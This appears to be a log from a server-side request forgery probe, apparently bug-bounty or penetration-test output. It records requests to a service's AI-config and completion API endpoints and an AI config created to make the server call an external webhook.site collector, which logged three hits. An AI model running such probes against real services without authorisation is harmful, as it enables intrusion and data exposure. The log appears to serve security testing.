@@ -1,0 +1,15 @@
+=== R20 HUNT5: AI completion proxy SSRF ===
+GET /api/v2/projects/default/ai-configs/model-configs -> 200 b'[{"global":false,"id":"zeno-custom-model","isRestricted":false,"key":"zeno-custom-model","name":"zeno custom model","tag'
+GET /api/v2/projects/default/model-configs -> 404 b' \n<!DOCTYPE html>\n<html lang="en">\n  <head>\n    \n\n    <meta charset="utf-8">\n    \n    <title>Not found</title>\n    <meta'
+GET /internal/ai-configs/model-configs -> 404 b' \n<!DOCTYPE html>\n<html lang="en">\n  <head>\n    \n\n    <meta charset="utf-8">\n    \n    <title>Not found</title>\n    <meta'
+model-config create -> 400 b'{"code":"invalid_request","message":"/required missing property \'id\'."}'
+ai-config create -> 201 b'{"_links":{"parent":{"href":"/api/v2/projects/default/ai-configs","type":"application/json"},"self":{"href":"/api/v2/projects/default/ai-configs/zeno-r20-aicfg","type":"application/json"}},"_maintaine'
+variation create -> 400 b'{"code":"invalid_request","message":"/required missing property \'key\'."}'
+completion POST -> 400 b'{"code":"invalid_request","message":"/required missing property \'input\'."}'
+completion POST -> 400 b'{"code":"invalid_request","message":"Error: Header parameter \'LD-API-Version\' is missing, Reason: The header parameter \'LD-API-Version\' is defined as being required, however it\'s missing from the requests, Line: 1, Column: 1031"}'
+collector hits: 3
+  hit: POST https://webhook.site/581be5ae-b84d-4440-98de-9f6773b5d534 ua=LD-Integrations/1.0
+  hit: POST https://webhook.site/581be5ae-b84d-4440-98de-9f6773b5d534 ua=LD-Integrations/1.0
+
+=== cleanup ===
+aicfg DEL -> 204
